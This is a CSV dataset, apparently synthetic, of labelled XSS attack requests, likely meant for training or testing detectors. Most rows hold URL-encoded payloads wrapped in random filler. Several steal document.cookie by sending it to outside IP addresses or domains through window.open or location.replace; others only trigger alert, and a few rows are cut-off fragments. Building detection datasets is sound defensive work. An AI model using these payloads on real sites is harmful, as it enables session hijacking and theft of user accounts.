id,class,vector
9376,XSS,/v7r1cocl/ii6qPSgwjV@0Sz/@L/xC.FtRz/TnMnnrt.gif?LJZrFFaq8BM=ao&Suiteroai5=o%40&e3o8gS9odtnt=%27iahieeaoo+b&hiQr9=%3Cstyle++++%3E%3C%21--%3C%2Fstyle%3E%3Cscript++%3E%5Balert++++%28%27D4jSC%27%29%3B%5D%2F%2F--%3E%3C%2Fscript%3E&iueoueigMesthm=240823576
9385,XSS,/i5lt3w/lnpuJYP6eMzCo4F4/yzX.0bfZg5L/Lv/YlXB%udlibWL/orwti.exe?H7S8=ho&utoTeyt=411926&eIsntti=%3Deqh&stI=%26%3Cscript+++%3E%5Balert++%28%275ptjh%27%29%3B%5D%3C%2Fscript++%3E&ilr=nZuSxk&otncmph=osnenDde&tEenaokT=thooSi
9390,XSS,/o.e4l/d69na3ao/iadlCtteele9/twonAn9satetWutfttI/tV/oIti/ieyns6ai/2MiRALFH/pigncp/n_KQ9ZR5354kvX/Ttjhuomeeothntbee.php3?w5gnb=Ndmpwgae&g0dEdveljeATl=s+o&be97nnjroa=%3Cscript++%3Ealert++++%28%27v0ya.yy0w%27%29%3C%2Fscript%3E&lRl9iniei=641&1grsH8N=rlmRnsyonpssscl&twQOGMr=8&nrtaitssmhw=zpi0f
9391,XSS,/HzfZV/Odrop1RpThavingzRQw4havingE.dll?anouhei70m1oo=%40&eegtwr=%3Cdiv++++style++%3D++++%22+behaviour%3A+++++url%28%5Bhttp%3A%2F%2Fwww.nd.com%2Fscript%2Fdin.php3%5D%29%3B++++%22++++%3E&wist=ohhaVtn&eisuNfEO=0320180
9393,XSS,/tTnRtnaehhoiresdle/iB-httpNaUKls4Y@G/DpxD/niwjv77-2aHM005/ypxm/Le7t/onl8KwtWsgg/i_B9vaDe9kHtq/qw9/vZbRne/dDe2a.yBASEQ/dRoH.jpg?.2Ow3ydeletelinkBE=av5%40x&at=spr%25hh%27Oss&ueuk=shileegpsh&aSn8hhrp1eq0=bscript5t&3mtmsS=%3Cbody+++++onload+++%3D+%22++++%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.ol.com%2Fcgi-bin%2Fnttaan.cgi%27%2Bdocument.cookie%29%3B%5D+++%22++%3E&asidksamrpt=%29oaps%3D&20hofnetadeIodn=036026
9401,XSS,/OboYsu/tu/pmbNrbi6Q782umVvN/i5-9N/kTiYnqdWvIEPI/nDdeZyN0R5r/GkswvCMZ-N6ka2W/nolgusOsyewe6ftrp.msf?urgdhselrar9w4c=ACi&rneege=%5Da+b+oapasswd+ursew+nlL&if7ouEwdvlTapi=c+9T4Mogr8uihOadaj0&hsyirxl6r=%3Cdiv+++++style++%3D++++%22+++++binding%3A+++url%28%5Bhttp%3A%2F%2Fwww.la.com%2Fscript%2FiYtue.aspx%5D%29%3B+%22%3E&rcciJFnhec=alion&hoohlo=0549275&@c0@includevpassthruk95=nIk7&mr748EfigVe=oneiynomdibE&TTwhoeelma=in&iim9=7539877
9423,XSS,/mPatdbIk-qz9Rk/epobgarecTef4ls/aQcUaH.pl?Sfig=9&jmnartehscq1hn6=kRaS3STP&jutvtshoeg=30&5qclgRf4pL=6M0acoxsr&gpac9rslenn=lmuel&PpasswdWFzservicesPgOxt=javascript%3A++alert+%28%22+b.Wy%22%29&to=m%3F&mN=gAb&hcb7tT=rtmeeduTyheHi5ucf&8CrmDexecsystem2h=tigasnaeshpassthru9nlt0ala+
9437,XSS,/hfigoiu9do/itTzuheatf0/eMJUhY/x2tZg-R_pU/ua9udnidfsarh7eiTead/sypSodwUJd@8X1w7yp3.mspx?AfBWunion@1@C.=ao&lmticdqTscast=%3Cstyle+++%3E%3C%21--%3C%2Fstyle%3E%3Cscript++++%3E%5Balert%28%27Iiizngekte%27%29%3B%5D%2F%2F--%3E%3C%2Fscript++++%3E&hlw=l9rece5ero&c4bnA=uHT
9440,XSS,/oASlSTD_3.g68q/riwNqUJi4RZq8arX0/kTvY@7mXcCi/vXoX.shtml?fpymsaiigal=9&Ashutdownr0=o7ltnresoap9&odoA3ud=%3Cdiv+style+%3D+++%22+++++behaviour%3A+++url%28%5Bhttp%3A%2F%2Fwww.etnaonma.com%2Fscript%2Fe0.swf%5D%29%3B+++%22+%3E&trgsUp8le=t&d8ettas=ywb0Gp_bN&NQc@6JXUcE=e4rqnNTihsosugsyi&inputfPSt=cu9pci-lpaouo+s&img=drCw&eldmEEnhcmwx=ievmutemeuwOt&tvek6=EannwssOsisxe&dst4eearrzato=u0BsKgqW2eRB&fhzt=9145093&iGvBUincludevwJmoi=%2FemrtycPas5objectt%3E&yarHwhece8s3w=4204102
9447,XSS,"dae=<img   src =  ""javascript"
9448,XSS,/3aLvpnLca9GfzuKJ4b6.php4?nwr5j=6573&lhasr0Jtnees=%3Cimg++src%3D++%22++++livescript%3A%5Bwindow.open%28%27http%3A%2F%2F60.213.98.140%2Fmaesst.exe%27%2Bdocument.cookie%29%3B%5D+++%22%3E&erGrEqx=603947&Wi2itnxsfakrce=5&lb6kidatie=y%28evalse&rjBBajprocessing-instructionxp_boot.inihtaccesu=SRitPpebEwTcL&kt4omsm=754305&enbtsoes=06019&lm=058557540&S3s=ea%2F
9454,XSS,/2@zH/alt7OltoAii.css?to=yrcNditsdwop1&nse=oS4er-eeb&ltssrskl=447&JMdeleteuyqs=%3Cdiv+style+%3D+++%22++++binding%3A+++++url%28%5Bhttp%3A%2F%2Fwww.arsi.com%2Fscript%2Fadaccs.bin%5D%29%3B+%22++%3E&TtjbI8e=alikeS%3E&6Zfc2KI=adRiiJAsm&xZyH8@QC=tietc&er=9066582&UHXe=i%3ARat+sy&noihrsr3=wsxobjectsvbitw&VNdmei=sotlehspbh9o%3E1&h3hct3eooouiQtn=Bsoiieaisoek
9463,XSS,/cAoip5o7euhreie3/T-fJlST/srXm1p9Goz.Uluhaving/tQ8Yz/eQZdbwwQ2mHLEtvT/axME.2TQFODCdmc1FZ/xOr/passthru50q0Zah5Zq-u.php?tg9a=17&btertaqIml9e=c%7Ce8&ties5ishHE=otexecs&Tlllmtin=e%3E+eaduhrsrn2&catbah6xgsse=iomwerzrbireGosee&mn=rB6tsuJm-z&ceotedZ=Oma1MNyeebiwntTped&fte5ce9=OlceAedl2&qenyEeniT=%3Cimg++++src+++%3D+++%22++livescript%3A%5Balert%28%27csdvi%27%29%3B%5D++%22++++%3E&pihsg7r=255728&one=tuaaw%28x&e6ti=%7C%25%3Bsip&3TQy_rSwbJO=8ws
9464,XSS,/hs4rJ5Uwzaieh0ooi/0eitneITttjrnms/s0..shtml?ektnkiosmuoieMa=tbJTkq%40H&l0H3=b5Eqbaa&ogcieo=%3Cobject+classid+++%3D++%22+clsid%3A...++++%22+++codebase+%3D%22++++javascript%3A++%5Bwindow.open%28%27http%3A%2F%2F87.231.253.75%2Foral.nsf%27%2Bdocument.cookie%29%3B%5D+%22%3E&hli97sSAom3enn=noa&open_location@kZmSZhJ=heqs%2FomservicesndoF%25e%24Ci&ra=Jtetibin
9487,XSS,/pehnsPec/h5ev1/roPPpf/dCnnE2tnssri/TK/rezo/zajxSb/R8d7rzeiXnb/nf6FI/HRcAa2HcobjectDuU.dZ/nxig2ardeodmixul.msf?7ao7=ejEthmmL&Rc55_=80903&TX9eAtc5aesd=lKiGnC69n&hoHt8HBqand=%28t%3AzTpasswdhf&exoyaa=j%3Dm
9489,XSS,pSiPn=eU_rFbA@8&tepznpasiOsnril=soorYcge
9498,XSS,"rnyia7kad3Im0=5328&_PY-dRsOCy3j=057886&orcatrtq=etjeval&Texec3updateV3A7V=T:ps remetaae&1Hlmlo0i3tigfhe=eee rconnect&hmbkn=etotgrnnesef&dote=<bgsound    src = ""    javascript:[alert ('nld');]"" >"
9504,XSS,mLsnennR3neLrc=7500147&sjag=&<script  >[alert ('ad');]</script >
9508,XSS,/tibs11T/uxtLy.wC6wX/thnhSgalrys/oa6ttD/smg3epriynsEtEh/AorrTftpj/ibmnnRaajntg.png?e8teohrweu=rernwS&tk=e9Fvz3iNHdjZ&satcnnn8llr=%3Cdiv++style+++%3D%22behaviour%3A++++url%28%5Bhttp%3A%2F%2Fwww.ones.com%2Fscript%2Fi6l5ns.msf%5D%29%3B++++%22++++%3E&x7dtte=bcrt6mtplrhf&FPunionlikenph-=ecmdlaL&masock_stream-a=oienb5omsjlQNbsgE&O8X6gnogO=f-f08K63J&kLe=Arcsa&hlqfoesfrhw=57
9519,XSS,/s-PKhE8/o85.HZn3Q8E5Z/6vZmpKxlANNoUncJ/voyxBDv7CYr/rjt7eetsgthtA/nvMMD/o8Fzoq/i4-E2F3Svu48jWeD/ixhiframeS04QMh4-/cq9ogIpov7.shtml?plaaaetkiffnbu=%3Ca+href++%3D+++%22+++++about%3A%3Cs%26%2399%3Bript%3E%5Bwindow.open%28%27http%3A%2F%2F94.157.84.146%2Forieta.cfm%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+%3E+++++%22++%3E
9526,XSS,/qFzLNOOv8/pourltFodcmvew/nlTdetiyxsscts1sroha/bHb.MCd9B/diio/ooI1/KHB9httpsgZ/rjHass5ftaeupa/_FGiPchilds4input5F/6gaHHBsfg5i24/pVlC8@lXS35qpSyqYAJC/30eweoritn.pl?pse=nt&ki3pee=s&ooo=nmtaafs6efeEoee&ear=593&tsSusoz=79965162&0home8-nodeHB9Ds4U=ic7-&dik8=9109327497&lestirhaede=%3Cdiv+style+%3D%22behaviour%3A+++url%28%5Bhttp%3A%2F%2Fwww.trreis.com%2Fscript%2Fth.asp%5D%29%3B++++%22+%3E&rcePhcvOimzmr=93683587&execIPvPctmT5Y=r6evvMisrt&40Kwznrneap=525&ZSz7KN=5554245
9532,XSS,/iydsni/6M0@9PrmAt7t/rrn/y_dcDUb7JC4YKAI8/ohoedenu/1oTlambyn/tqD/e8vC/tty0heasatiH/tOP/i_q935ys.5UsFw.sh?D8TWNWlocationlKqc=7843&88exechtaccesO6UYLN=a+tm&e9tas5e=h28068Q&pbs=aceafnsohuExe&twdz6s3dil=%3D7eoa6lscript0sdbesj&esiumno2USe=s8memee59
9541,XSS,4S3renabsha=kNZanf7mh&5@f0-s6z=qmthwp-&btaeifuaier=2785304482&ebhtgaw2vpmi=hn&ooMOise=EIpaitldaieR&M6wC5a=xrCGMZwmcgBS&hptassraalort=sUu&iDihLfruBsaou=rtZtftpheo pautoexecdie&one=98166&EA3eedihen=cvc7B3fTRc&nt5qchfm=2?&toaa=<img  src=&{[window.open('http://65.138.216.145/nt.cgi'+document.cookie);]};  >&viVheB=e3.1ljm.EW&Vy0Tevv2P=2797788
9552,XSS,"P7d4sMJ=73628&FMTY=630865108&0znUltoe=<link     rel=""  stylesheet""  href   =   ""  javascript"
9553,XSS,/tgntiiesTxc.sh?1tbewIWEc=h86n&Wtasu3ugot=where%24%5D&xvgt4=leivaoand&ht80xemcig=%3Cstyle+++%3E%3C%21--%3C%2Fstyle++%3E%3Cscript+%3E%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.tach.com%2Fcgi-bin%2Fgero.cgi%27%2Bdocument.cookie%29%3B%5D%2F%2F--%3E%3C%2Fscript++%3E&IzzwO-=l%27RN
9568,XSS,/h72d4_uRJ_Mv8f5/vwtgSu9gcQt/wssDcOpo5inefc29h9/rx.I8zi-lSB3mj/3nre/hieapxdDrAeaDhiw/ev03v/b2/hYkiK3iJxVED9.js?muexoEbvtt=%3Cobject++++classid+++%3D+++%22++++clsid%3A...++++%22+++codebase++++%3D++%22++++javascript%3A%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.ll.com%2Fcgi-bin%2Fer.cgi%27%2Bdocument.cookie%29%3B%5D++++%22++%3E&tftgn13tsi=%3Amcs+oSsenk&stp2aa=%3Fbinn1b&2e=e7RwNPEDi&XscriptmochawhereQ1KvP=nupdateci7&@0wY@NX=%25uy&1irag4a4N6ietaa=371847227&fiv=Gestgonaea6tnco
9570,XSS,/raSoeiimrWatnim/7lhiwbkuoail/tlmyo/RySAT.Yconnect0/ld8tfceg/rvZHtY/sr3/ginsertMF07CmOBeHc/nwecetrcYoepirehiAnb/ob1aneSpto.pl?0hrc4hinumt=6&4fqtIc=%3Cxml+id+++%3D++%22++++X++%22++++%3E%3Ca++++%3E%3Cb+%3E%26lt%3Bscript+++%3E%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.asastrta.com%2Fcgi-bin%2Feson.cgi%27%2Bdocument.cookie%29%3B%5D%26lt%3B%2Fscript+++%3E%3B%3C%2Fb++++%3E%3C%2Fa++%3E%3C%2Fxml+%3E&6tuau0hunseD=rlsw5aad8&na=199980&oin9s=eGl-4O&OMxp_OST@8dJ=ea3&hu2letitnrfr0=hn84%3Fie&f8aniss4sP9xf=2from%29&rekmid=st&taedoddepuueez=+tsnEhc1d&_1eW5_=dvnNcQ4
9583,XSS,/aOp/toe3thrteDasfe.cgi?n1=0553501&2cosyahazdEa0=%3Cxml+id++%3D%22++X++%22+++%3E%3Ca++%3E%3Cb++++%3E%26lt%3Bscript%3E%5Bwindow.open%28%27http%3A%2F%2F215.155.158.120%2Fsema.swf%27%2Bdocument.cookie%29%3B%5D%26lt%3B%2Fscript+%3E%3B%3C%2Fb%3E%3C%2Fa++++%3E%3C%2Fxml++++%3E
9589,XSS,shutdownsock_streamagm9=u7S&mxb=52731&PZKS=82&sdeot6ta2ehe=weu&rah=ztmtiadqAe&n7t=zrt1l/ou1n9rd&rronrtot=9595340517&rvLBZY.=al
9597,XSS,/hmrtleh2weehdU/nafsta54eebum/zharecss/ei2aed3ie8htylso5stt/8en9d/5m.autoexecchildh5/ic40lqsttennfx/KV5P7DZs.catdi/d3FtN.sh?99ttrret5s0=%24+u%3Anwget%2Brcpbunionnimgmetas+oSm&k2YnehTfraz9e=94&iSeIeon=tsics&jOv6tczuidrsD=2414&7dem=%29+47os&tdlas9Boat6bt=jboD0V&enuctso=%3Ca+++href++%3D++%22about%3A%3Cs%26%2399%3Bript%3E%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.sien.com%2Fcgi-bin%2Fna.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript++%3E++%22++%3E&otlt=r+&nAhJ8gDa=r%7EEjoholTufepassthru&pHiafieTlc=cgok&ntHun7Zpr8Rd=oig3&msbtrnPw=iww3e&Zand59y8.Vh=7006131565&ltd0l=weiimg%2Be&4na=22
9603,XSS,/hhAli/2tciitsghre/0ITa7bRt/ooleh9/LVhPrYDd/i.bPA/1S@TPjx.DJ1nHCBC7S/lSK0UmCyI9Ni.8cYh/t16MNDZYvV/aQu7.e30rR/hhSawrh/Qx68oJ.7uL.dll?wst4haakSm7os=orcwo+&e4Sap=97312&pscriptt4libu=uOcopyawindow.openZi&pNysuostEtra=shutdownb&tqeuzs=%3Ciframe++++src+++%3D+%22vbscript%3A%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.atis.com%2Fcgi-bin%2Folre.cgi%27%2Bdocument.cookie%29%3B%5D++%22++++%3E&Jftpl_EjFwi=2rNe&d9aats7aaFre=8oxt.MQ&twqrTrsiO=pJ4qbemC.&srnlraits94xogf=4912983905&DpnfP=kx&arnmaIly=rlse
9609,XSS,/icg/eWjX3BsonV7TJX-4DMLW.asp?itdbreendooooo=+lOea&4smseh=tnm9PzlsThnit&6trieeabwti=iokvQObEK&L3netcatNR0=%5DmAoef&E3n1rni=his%29%26&_cqVKQQb8TZG=8023&satDrT2he=enbgsoundim+79eeA&w23i=ptcty&8catqsttmi=dadpi0&io=Guy&r9huehx6nnd=unedm4e&HBFY@7adminX48=66&ehhtditwfntai=%3Cdiv+++++style%3D++%22binding%3A+++url%28%5Bhttp%3A%2F%2Fwww.ndnstoll.com%2Fscript%2FoP1ifoixde.php4%5D%29%3B+++%22++++%3E&ys=qefo
9611,XSS,/wKIX44AZr.dll?gsgErIHni6f=%3Cxml+++src+%3D%22javascript%3A++%5Bwindow.open%28%27http%3A%2F%2F64.38.29.150%2Ftiveor.bin%27%2Bdocument.cookie%29%3B%5D%22%3E
9613,XSS,/sXD3ihLW3/swHOuGu.GBfkC/oc0eaeerthReeespI.php3?
9620,XSS,/a_FIxbd-i0VMuX/tLh89OaE9/efnGjmkA/@.eqnidYXDqaey/heoopiyail/i3zQSu9RZI.jpeg?rtZZUCnodehome=99&8ol8oam1ntUnsm=3s8freq7c&1Rbsn=dTKpBm&Ro5EudmeceHU=opth3phfromuy&wz3Eiuwodgmly=%3Cobject+classid++%3D%22+++++clsid%3A...++++%22++codebase%3D%22+javascript%3A%5Balert+%28%27leSerkn%27%29%3B%5D+%22++++%3E&rpztbcnl=%26ecb
9628,XSS,/libdb/emo4/12f./t-SxRT8w9DzSCKDtVfJ/czhoipnvpoqao3aeE/likeXQ9ydeleteGK@.nsf?trte=%3Cimg+++++src++++%3D++%22+livescript%3A%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.la.com%2Fcgi-bin%2Fetrontte.cgi%27%2Bdocument.cookie%29%3B%5D+++%22+++%3E
9629,XSS,/<script>alert('Vulnerable')</script>.shtml?
9640,XSS,/dnd2TntorcrESeli/dJIGBhpz/eQbgW.EaG4/bK2lpQN/c-ik/sN/1i.E@t@Qlv-I9.png?eantysieLott=dte&r5DwiUss=4&rcxrdettmhlahmh=c&nEdulNm=isetc&ttiatttseq=ohtau+++style%3Dleft%3Aexpression%28alert+%28is8h8s.RTs%29%29&nlenl9m=n&W@k25_cdeleteOhtaccesxP=4926198&-H9Wtpsc-@=704
9650,XSS,/kHkG8jJQygk1iW/axB2ksHL.css?UvoiroLsTcselho=17046762&tedtantio=Mbes%22+++++++%3E%3Cbody%2520onload%3Dalert+++%28document.cookie%29%3B++%3E&a.DKAW=o+t5&hvdxacetoieos0=606254&eaywbetween=+%5Bqns%28%29bCek+1i
9663,XSS,/rzsf/erotaio2taHnle/nelfcyJi/m5/q_kE_wnQt1QziG8n0sW/h6lGqeR7WZ5YX6KmU/pZinIT/8gmZcs.ldN@UhG/fPmailu9.mspx?5drlh7ss=dpRra&ryU0bVYf5EAelcn=443037727&oa=17&saIeuchymgz=1838&CjE-0FY1=ooeehli&k3L7adminmhNVMB0=t-&o5fmcrabys6=2hh1e&n8emn=javascript%3A++alert+++%28+++++%22+s8.9%22%29&hdlnLo=01430&3ahegade=738&TvwRuYS=318&l8iaesh=aeedh80Dyp&ejhetttnuaghs7=4&ibnryereeg=sdaneOhaSOry%7Ee
9667,XSS,"3f-QACfD6QGls=<bgsound  src=    ""   javascript:[document.location.replace  ('http://www.atorlati.com/cgi-bin/roetch.cgi'+document.cookie);]   ""    >&bsmo2=4300341199&88Kb7@OTsWOf=006&eg=hcM&eretTba=fOnzooyG&aifhmmokfnaey=fl6on2i6okn&iwttT10=mha9uJecoubla3ehk&zu=2oiEakisgehnEi"
9675,XSS,/6y8/lpositionjTAiE2/fV-OfWdfc/asznretnincG/l-WxzrUQQ/6k/haa0raetrla5smteoZe/2b/gfiksoewuneae1st/kuP0pN0AaX3VA/-Gb_@Ls5fB/aHZn7Di-8hKx.css?weEabAetyTR=deleteyi&t9se=95&ECf4e=yeDni&K0S191@DLbody2=%3Cdiv++style+++%3D%22+behaviour%3A+++++url%28%5Bhttp%3A%2F%2Fwww.gesill.com%2Fscript%2Fi93nib5nu.asp%5D%29%3B++%22++%3E&KTiiqsmea8rhu=rhUL&tLhoa=3630&peTulneteheEez=6406516&7.yk8=mroUj6tANGR&iit=tnc&4ilcner=yeedaptmbfbggTo&9Js9KgCyK3=e%2Bhtaccesn7%7CEfl&tinheGhieitrt=6kesn%2F&te=cps1&4Eanotj=keo
9700,XSS,"/""><img"
9707,XSS,/mvxreqLpoCddntwra/chfGxdvcdHe/d@k/nG/wHO.php3?Me=79&s4roownh=6r%26-pfd&yplw4RK=execr%3C&Fsim5e=iwNbaL1F&etqld=%3Cmeta+++http-equiv%3D+++%22+refresh%22+++++content++%3D+++%22++0%3Burl%3Djavascript%3A+%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.geienaes.com%2Fcgi-bin%2Flelanede.cgi%27%2Bdocument.cookie%29%3B%5D%22%3E&EeadT1e0=wneCe+%27%28f%3B&un3pepe=a%25eendt%3BYoJ+S&afwbmaenstee3oe=ibgsoundnd%28
9708,XSS,1Y8link2jjRqJHi=8yud6j&0jgYrS=rayeievalui&KPAwindow.openorUUp=mFm9ALhu&sgpesx2euC=naehyuTNmh5&ytan6useetyt=eAXeCw
9716,XSS,/-3WTO3cDG/e@1PAAyq./cu/eb/b9efign/5NxDb-BTE/ainnyIaO7Eaakict/deeah/kcsystemcaccess_logG6vptI7..png?ubaadaeopa=%3Cdiv++style++++%3D+%22++++background-image%3A+++++url%28javascript%3A+++%5Bwindow.open%28%27http%3A%2F%2F172.120.148.81%2Fnilesi.nsf%27%2Bdocument.cookie%29%3B%5D%29%3B+%22++++%3E&qs=723&0vz8Z1icS=%24seeun3nu%3B&cao=sn&zxcTa7oebntG=%5Dimgautoexec&lD0hq=1
9721,XSS,/0FyI2_2ClQ_CL/tzes81oieta/sddHf/uJ/oDhWmmb0IIKq.CNIH.shtml?5bsbMo.samQ=tfylenaieli+&wRtHeatgsionnN=mtt8ltospsnwmnsfsi&z.httpsetOhyqeval1=tLJGAn&s.CbD=%3Ca+++++href%3D+%22++++about%3A%3Cs%26%2399%3Bript+++%3E%5Bwindow.open%28%27http%3A%2F%2F163.124.77.91%2Frolare.php3%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript++%3E++%22+%3E&qmmW5AcB=hZCMOLBaUYV&narqlneEtaj=86921&V5qoE7O.7F=68&fia5erb3ekcl=e2s%2Bat+adl+&Nqet95feaaheE=tsn5e7
9724,XSS,/oaqJRfPk673yh/ryD5P_t/cID/8updateeEechoPE/twyidkgq/aEacKzeemeems/ya41QZ.cfm?E1DynSy=%3Cdiv++style%3D%22background-image%3A+++url%28javascript%3A++%5Bwindow.open%28%27http%3A%2F%2F152.236.236.138%2Fnsesis.dll%27%2Bdocument.cookie%29%3B%5D%29%3B+%22+%3E&gnes8sa=ltfsoconnectehttproU&ioMoisli=765&6oitio=7310884429
9731,XSS,/yIetcDh9XSsreplaceobject/R0wXDDRfvnQ/eCM8wGZnOdVS9e4ZGGBw/he/gaethoof/YdrE2cwNrnses/rQu8.js?iirdErpre9itmnr=bsiIaacerae5%2F4y&hueachagehs=3t0aabX&xtc=2&neTeannadeeotsr=%3Cdiv+++++style++%3D+%22behaviour%3A+++url%28%5Bhttp%3A%2F%2Fwww.arna.com%2Fscript%2Fmb2itxewe.pl%5D%29%3B+%22++%3E&nyn=65425&VJdiD=ssrmetapi%7E3%26&gooiObtb3s=69837316&21eTs3iohaxrtw6=rrT&Ae7woaahh=a9ZROCL3qzy&5psEdtl5=Xddyyiec%28cralxc3%3E
9743,XSS,HshLnRoeo=79557&lsF=7529&TCiyeeepeL=1naaeudlotcnto&loguc50Ts6otd=554611&AlcolpitwR=h&Nuaccess_log_V=n&tnesrbt=3446369&Reoeikes=6gCL0OX3-&dfbmochahWqUVkP.=c2H_&nAecdloonne9st=nninetcattsnn$'|]https&fhghSnoiTxih=bs4
9746,XSS,/gihk-6Kc1F1/eizietem/3NfforrsoFeirsEgnaet/a8.css?allCKKsDdO1q=%3Cimg%2Bsrc%3Djavascript%3A++++alert%28%27d4eae.Eetwyu%27%29+++%3E&accept5eOtN=29709&te6tdth=3
9747,XSS,/anjessdelieogk/w6N/Iaccess_logyfn/a2OqKhw9pu67F9u2/zGoNNr/eTXTGCg2ZGJ7jZPjzQ/eIIPwCi/sQIHBuEjF9rV4z78pi2z/9Hg8cElY.yI/tJa3hsraazrbmea4l.shtml?
9750,XSS,eNeeitsthwsrem=oiZqcl9ay44iw1hhs&ZTalAJZxi=eraanaevanUser&dsteuTdTtYoisyb=Y &OIctcks5lhun=[\xC0][\xBC]script   >[document.location.replace   ('http://www.gelameve.com/cgi-bin/ic.cgi'+document.cookie);][\xC0][\xBC]/script >&ntsNdtie=06374&aa1osaLfi9tago=lnFMMktW&n6U=39330&aroFEag=177683658
9761,XSS,/iYU8G4xzX/a91oateIuvdlte/ewZytLL1cls/zassrt5t3a/3ClEtMvar_kcZ/IJnR/@nB3/of6er/rdsd5mnaaAdeie8mnirg.nsf?3afkmt=176&IasexecQZc8Ryc=tutetylenas%3Ceeathavingna&6wE8wuEalrdrci=%3Cxml+id+%3D+%22+++++X+%22+%3E%3Ca++++%3E%3Cb++%3E%26lt%3Bscript++++%3E%5Bwindow.open%28%27http%3A%2F%2F254.230.206.93%2Fri.php3%27%2Bdocument.cookie%29%3B%5D%26lt%3B%2Fscript%3E%3B%3C%2Fb%3E%3C%2Fa++%3E%3C%2Fxml%3E&iraoodarep=edivt5update%2FHPjnma+mjperl&ffRHhwget=63729
9763,XSS,/ostoi6/m6N6s/_abiframehd8YQkDb5Pj/7t/gdeh5/nK9hmApO/0w/aqwuqhEGEunion.jpg?thcmihIas=utGs3connect8ru2hr&FXEusrCF=oNaupescka&sTudmwlIger6f=394040&me4Hictnmrk=tnfd%5Da%3B%28+%5Bga&wreNeap9prsaoe=elnsitems4d&TtxrhLkzsicd=%5Cah%3Apopt%5Deodc&89bMBc=%3C%21%5BCDATA%5B%3C%21--%5D%5D%3E%3Cscript+%3E%5Balert++%28%27iIevsie%27%29%3B%5D%2F%2F--%3E%3C%2Fscript+++%3E&1siaef7nR2x=0d4O3d-+aboot.inioiunion&iipme0Iihocen=5726686362&nmrhbec=e+a7hfb
9765,XSS,/tteSAI8A/dxSS9Ho./aBb7GR0r.4HEX3/heOoRrli/tGKmF_o.giVS1A8Mp/c5ZqpjtGRRuvc/m0K/uNnedtnle2naxNuttaor/tca8rn7oiaer.exe?edst2e=gefi8sRh4&k1wgm=%3Cimg+++++src+++%3D%22+++++ietiri%22onmouseover+++%3D+++%22+++%5Bwindow.open%28%27http%3A%2F%2F243.205.129.77%2Fsedeli.jsp%27%2Bdocument.cookie%29%3B%5D++%22+%3E&muvo=etoroioelwcofeUntO&0yG41=vMIn8XE3igFK
9771,XSS,/eCAr.htm?hi7moWdixpes6=%3Cdiv++++style+++%3D++%22+width%3A+++++expression%28%5Bwindow.open%28%27http%3A%2F%2F160.164.65.143%2Fri.swf%27%2Bdocument.cookie%29%3B%5D%29%3B+++%22+++%3E&ninr0r=r0dux%7E&thnrnilseiTtmga=mebQ&egdiOehedytenen=553708&aKhlhap=94507
9793,XSS,vRnufieonIhe=r
9797,XSS,/nhd1hwts5nn/nrzcfsnd/areeeemaqdnTosthmtfP/tK85/e23z7g93m4QkzbB/eaa6s0h/rnirnsE3roa.js?mtlrrne=mcseteh3ec&0rrfetenisJrs=or&aioae66eiwcxui=%2Bbosfdfta&peTjrme1Mtano=C%24i%5B&cm6wgethIiA=hecho5m&rtHiemoTitE=%3Cimg++dynsrc%3D+++%22+++++javascript%3A++++%5Balert++++%28%27tmd%27%29%3B%5D++%22+%3E&LPlinkUoeM=ftp%3Du&eahtdaPmsamo7o=953965&wc8sahp=1&Ymwlu=8&XxtermZinput9=or9Uhu&ts7RE=43&ul=ropaI8Czh49oahle&obdtnuadu60rg=79&Isro=rmUq6H
9803,XSS,/oeloer07cradhkm.tiff?gyis=8867&7isinintNah=sgc%3En&6behEstT=l7derno&VfVT=ing&fnit=uMbsyscreon&ixedo=neE2TbTRGCMb&taeeorty8na=921&fnos=0WEL%40APD&bSe3bAp7yW5dl=5eSy+&5homeiC3Wl.=3878910040&wsvea3jn=oteetmseorbhf&aeYioogothe=6544153&oo1epnaeGa=99761003&s4xvirieztna=s2
